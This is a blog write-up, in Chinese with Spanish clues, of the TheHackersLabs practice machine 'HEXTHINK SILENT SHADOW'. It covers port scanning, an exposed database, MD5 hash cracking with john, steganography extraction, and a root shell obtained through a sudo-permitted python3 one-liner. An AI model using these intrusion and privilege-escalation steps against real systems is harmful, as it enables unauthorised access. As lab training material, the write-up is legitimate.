{"pageProps":{"postData":{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","contentHtml":"<h1>HEXTHINK SILENT SHADOW</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/110\">https://labs.thehackerslabs.com/machine/110</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  HEXTHINK_SILENT_SHADOW nmap -sT -min-rate 10000 -p- 192.168.56.97\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:39 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.97\nHost is up (0.00038s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n9090/tcp open  zeus-admin\nMAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 3.42 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  HEXTHINK_SILENT_SHADOW nmap -sT -A -p 22,80,3306,9090 192.168.56.97                           \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:41 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.97         \nHost is up (0.00041s latency).\n                                                                                                \nPORT     STATE SERVICE    VERSION                                                                                                                                                               \n22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:        \n|   256 4d:6e:39:a4:15:86:88:70:c7:9d:09:91:a3:0b:18:8c (ECDSA)\n|_  256 f9:21:5d:25:ee:76:05:db:01:3b:45:c9:68:b0:82:9f (ED25519)\n80/tcp   open  http       Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)                                                    \n|_http-title: Site doesn<span class=\"hljs-string\">''</span>t have a title (text/html; charset=UTF-8).\n3306/tcp open  mysql      MariaDB 5.5.5-10.11.11 \n| mysql-info:      \n|   Protocol: 10         \n|   Version: 5.5.5-10.11.11-MariaDB-0ubuntu0.24.04.2\n|   Thread ID: 35                                                                                                                                                                               \n|   Capabilities flags: 63486                                                                   \n|   Some Capabilities: SupportsCompression, Support41Auth, IgnoreSpaceBeforeParenthesis, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, FoundRows, SupportsLoadDataLocal, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins\n|   Status: Autocommit                                                                                                                                                                          \n|   Salt: BwQo]cXnB?UoLmc(9<span class=\"hljs-string\">'Wb                                                                  \n|_  Auth Plugin Name: mysql_native_password\n9090/tcp open  tcpwrapped     \nMAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)                \nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                           \nDevice type: general purpose                                                                    \nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19                                                                   \nNetwork Distance: 1 hop                                                                         \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                         \n                                                                                                \nTRACEROUTE                                                                                      \nHOP RTT     ADDRESS\n1   0.41 ms 192.168.56.97\n                                                                                                \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                           \nNmap done: 1 IP address (1 host up) scanned in 13.54 seconds \n</span></code></pre>\n<h3>枚举</h3>\n<p>访问 <code>HTTP</code> ，提示了很有意思的东西</p>\n<p><img src=\"/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image1.png\" alt=\"image.png\"></p>\n<p>得到数据库的用户 <code>ctf_user</code></p>\n<p>连接数据库，意外的发现不用数据库</p>\n<p><img src=\"/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image2.png\" alt=\"image.png\"></p>\n<p>数据库里面好几个表（账户，雇员，消息，供应商，用户），还存了一些图片</p>\n<p>一些有趣的信息：</p>\n<pre><code class=\"hljs language-bash\">Buscamos pentesters sin miedo. Contacto interno: d3v@n0m41n.\n//\nadmin\t21232f297a57a5a743894a0e4a801fc3\n<span class=\"hljs-built_in\">test</span>\t098f6bcd4621d373cade4e832627b4f6\nsupport\te99a18c428cb38d5f260853678922e03\nh4cker\t5f4dcc3b5aa765d61d8327deb882cf99\n</code></pre>\n<p>我们将用户表进行爆破</p>\n<p><img src=\"/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image3.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  HEXTHINK_SILENT_SHADOW john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 <span class=\"hljs-built_in\">users</span>\nUsing default input encoding: UTF-8\nLoaded 4 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support <span class=\"hljs-keyword\">for</span> this <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-built_in\">type</span>, consider --fork=8\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\npassword         (h4cker)     \nabc123           (support)     \nadmin            (admin)     \n<span class=\"hljs-built_in\">test</span>             (<span class=\"hljs-built_in\">test</span>)     \n4g 0:00:00:00 DONE (2025-07-30 21:54) 200.0g/s 8313Kp/s 8313Kc/s 9350KC/s tyson4..tauruz\nUse the <span class=\"hljs-string\">\"--show --format=Raw-MD5\"</span> options to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>目录爆破</p>\n<pre><code class=\"hljs language-bash\">➜  HEXTHINK_SILENT_SHADOW feroxbuster --url http://192.168.56.97/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip\n                                                                                        \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.97/\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ <span class=\"hljs-literal\">true</span>\n 💲  Extensions            │ [asp, php, txt, zip]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET        3l       38w      383c http://192.168.56.97/\n200      GET      872l     4588w    76866c http://192.168.56.97/index2.php\n200      GET        3l       38w      383c http://192.168.56.97/index.php\n301      GET        9l       28w      319c http://192.168.56.97/javascript => http://192.168.56.97/javascript/\n200      GET      872l     4588w    76849c http://192.168.56.97/info.php\n301      GET        9l       28w      326c http://192.168.56.97/javascript/jquery => http://192.168.56.97/javascript/jquery/\n[####################] - 3m   3114515/3114515 0s      found:7       errors:4      \n[####################] - 3m   1038145/1038145 5925/s  http://192.168.56.97/ \n[####################] - 3m   1038145/1038145 5868/s  http://192.168.56.97/javascript/ \n[####################] - 3m   1038145/1038145 6569/s  http://192.168.56.97/javascript/jquery/ \n</code></pre>\n<p><code>index2.php</code> 和 <code>info.php</code> 是一样的</p>\n<p><img src=\"/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image4.png\" alt=\"image.png\"></p>\n<p>扫描后发现，用户表中信息无用，我已经将其拿去进行爆破了，但是没有结果</p>\n<p>然后 <code>notice</code>表中，有一个 ‘你已经走了很长一段路。但还有很长的路要走……’，并附上了一张照片</p>\n<p><img src=\"/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image5.png\" alt=\"image.png\"></p>\n<p>我们将照片保存下来，格式是 <code>JPG</code></p>\n<p><img src=\"/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image6.png\" alt=\"image.png\"></p>\n<p>我们尝试提取信息</p>\n<pre><code class=\"hljs language-bash\">➜  HEXTHINK_SILENT_SHADOW binwalk -Me --run-as=root 2.jpg    \n\nScan Time:     2025-07-30 22:34:11\nTarget File:   /root/Desktop/TheHackersLabs/HEXTHINK_SILENT_SHADOW/2.jpg\nMD5 Checksum:  1576b20a92fe6ac42b11889e1f790aa1\nSignatures:    436\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\nWARNING: One or more files failed to extract: either no utility was found or it<span class=\"hljs-string\">'s unimplemented\n\n➜  HEXTHINK_SILENT_SHADOW stegseek 2.jpg            \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"hello\"\n[i] Original filename: \"instrucciones.txt\".\n[i] Extracting to \"2.jpg.out\".\n</span></code></pre>\n<p>最后使用 <code>StegSeek</code> 能获取到东西</p>\n<pre><code class=\"hljs language-bash\">➜  HEXTHINK_SILENT_SHADOW <span class=\"hljs-built_in\">cat</span> 2.jpg.out                 \nPara continuar deberás abrir el Puerto 9090\n\nEsto no es un escaneo Es un saludo\n\nEnvía la siguiente cadena al puerto 9090:\n\nLOGIN whisper\nKEY whisper9090\n\nNo lo hagas mal Solo hay una oportunidad\n</code></pre>\n<p>让我将其发送到 <code>9090</code>，并且只有一次机会</p>\n<pre><code class=\"hljs language-bash\">➜  HEXTHINK_SILENT_SHADOW <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"LOGIN whisper\\nKEY whisper9090\"</span> | nc 192.168.56.97 9090\nUsuario SSH: whisper\nContraseña: 7h3m1nDf0x\n</code></pre>\n<p>发送后得到一组账户凭据</p>\n<p>我们进行 <code>SSH</code> 登录，拿 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">whisper@server:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nTHL{8axxxxxxxxxxxxxx\n</code></pre>\n<h2>权限提升</h2>\n<p><code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">whisper@server:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> whisper on server:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser whisper may run the following commands on server:\n    (ALL) NOPASSWD: /usr/bin/python3\n</code></pre>\n<p>梭哈</p>\n<pre><code class=\"hljs language-bash\">whisper@server:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/python3 -c <span class=\"hljs-string\">\"import os;os.system('/bin/bash -p')\"</span>\nroot@server:/home/whisper# \n</code></pre>\n<pre><code class=\"hljs language-bash\">root@server:~# <span class=\"hljs-built_in\">cat</span> root.txt \nTHL{Zpxxxxxxxxxxxxxxxxx\n</code></pre>","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","updated":"2025-07-31","tags":["TheHackersLabs","Linux","Mysql","Python"],"categories":"靶机","comments":true,"description":"HEXTHINK SILENT SHADOW\n\n https://labs.thehackerslabs.com/machine/110\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\n枚举\n\n访问 `HTTP` ，提示了很有意思的东西\n\n\n\n得到数据库的用户 `ctf_user`\n\n连接数据库，意外的发现不用数据库\n\n\n\n数据库里面好几个表（账户，雇员，消息，供应商，用户），还存了一些图片\n..."},"recentPosts":[{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true}